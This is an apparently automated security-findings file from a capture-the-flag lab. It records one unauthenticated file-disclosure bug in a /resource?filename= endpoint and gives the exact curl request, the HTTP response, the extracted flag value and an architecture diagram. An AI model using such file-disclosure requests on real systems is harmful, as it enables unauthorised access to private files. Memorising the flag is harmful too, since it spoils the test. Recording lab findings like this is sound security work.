@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:14:05.781105+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "3c343394-0e48-4004-9428-dc45797bf04b",
+      "timestamp": "2026-04-12T21:14:05.780984+00:00",
+      "title": "CTF Flag Extracted via Unauthenticated File Disclosure - /resource?filename=flag",
+      "severity": "critical",
+      "target": "http://172.17.0.1:41823/resource?filename=flag",
+      "description": "The /resource?filename= endpoint serves arbitrary files without authentication and without path restriction validation. By requesting /resource?filename=flag, the CTF flag file was returned directly. The endpoint is referenced in the login page HTML for serving static assets (CSS/JS), but is not restricted to a safe directory \u2014 any filename can be requested. Additionally, /static/ returns 403, making /resource?filename= the intended attack path per the CTF hint ('flags don't change... they are kind of static... try to get that resource').",
+      "evidence": "GET /resource?filename=flag HTTP/1.1\nHost: 172.17.0.1:41823\n\nHTTP/1.1 200 OK\nContent-Disposition: inline; filename=flag\nContent-Type: application/octet-stream\nContent-Length: 42\n\nflag{f2415bf1-1c95-46bd-88fb-14762c7808fa}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl http://172.17.0.1:41823/resource?filename=flag",
+        "expected": "flag{f2415bf1-1c95-46bd-88fb-14762c7808fa}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "4b00e86c-d668-4128-8f2a-5c1beabcd1f0",
+      "timestamp": "2026-04-12T21:14:15.905326+00:00",
+      "title": "CTF Target Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Login[\"/login (GET/POST) - Login Form\"]\n  Browser --> Resource[\"/resource?filename= - File Serving Endpoint\"]\n  Browser --> Static[\"/static/ - Static Files (403 Forbidden)\"]\n  Resource -->|\"filename=flag\"| Flag[\"flag{f2415bf1-1c95-46bd-88fb-14762c7808fa}\"]\n  Resource -->|\"filename=css/bootstrap.min.css\"| CSS[\"Bootstrap CSS\"]\n  Resource -->|\"filename=js/bootstrap.bundle.min.js\"| JS[\"Bootstrap JS\"]\n  Login -->|\"Redirect 302\"| LoginPage[\"Login Page HTML\"]\n  LoginPage -->|\"References\"| Resource\n  LoginPage -->|\"References\"| Static\n  style Flag fill:#ff4444,color:#fff\n  style Resource fill:#ff8800,color:#fff"
+    }
+  ]
+}
